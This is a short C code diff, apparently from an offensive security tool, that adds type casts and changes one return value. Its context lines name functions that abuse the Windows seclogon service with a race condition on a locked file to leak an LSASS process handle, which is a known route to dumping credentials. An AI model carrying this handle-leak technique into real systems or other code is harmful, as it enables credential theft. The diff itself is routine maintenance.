@@ -551,7 +551,7 @@ DWORD WINAPI thread_seclogon_lock(
 {
     PTHREAD_PARAMETERS thread_params = (PTHREAD_PARAMETERS)lpParam;
     if (!thread_params)
-        return -1;
+        return 1;
 
     malseclogon_trigger_lock(
         thread_params->pid,
@@ -573,7 +573,7 @@ BOOL leak_lsass_handle_in_seclogon_with_race_condition(
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     UNICODE_STRING file_to_lock = { 0 };
     file_to_lock.Buffer = L"\\??\\C:\\Windows\\System32\\license.rtf";
-    file_to_lock.Length = wcslen(file_to_lock.Buffer) * sizeof(WCHAR);
+    file_to_lock.Length = (USHORT)wcslen(file_to_lock.Buffer) * sizeof(WCHAR);
     file_to_lock.MaximumLength = file_to_lock.Length + 2;
     THREAD_PARAMETERS thread_params = { 0 };
     OVERLAPPED overlapped = { 0 };
@@ -711,7 +711,7 @@ DWORD get_pid_using_file_path(
     IO_STATUS_BLOCK IoStatusBlock = { 0 };
     UNICODE_STRING ustr_file_path = { 0 };
     ustr_file_path.Buffer = file_path;
-    ustr_file_path.Length = wcslen(ustr_file_path.Buffer) * sizeof(WCHAR);
+    ustr_file_path.Length = (USHORT)wcslen(ustr_file_path.Buffer) * sizeof(WCHAR);
     ustr_file_path.MaximumLength = ustr_file_path.Length + 2;
     PFILE_PROCESS_IDS_USING_FILE_INFORMATION pfpiufi = NULL;
     ULONG pfpiufiLen = 0;
@@ -774,7 +774,7 @@ DWORD get_pid_using_file_path(
     processIdListPtr = pfpiufi->ProcessIdList;
     // we return only the first pid, it's usually the right one
     if (pfpiufi->NumberOfProcessIdsInList >= 1)
-        pid = *processIdListPtr;
+        pid = (DWORD)*processIdListPtr;
 
 end:
     if (hFile)
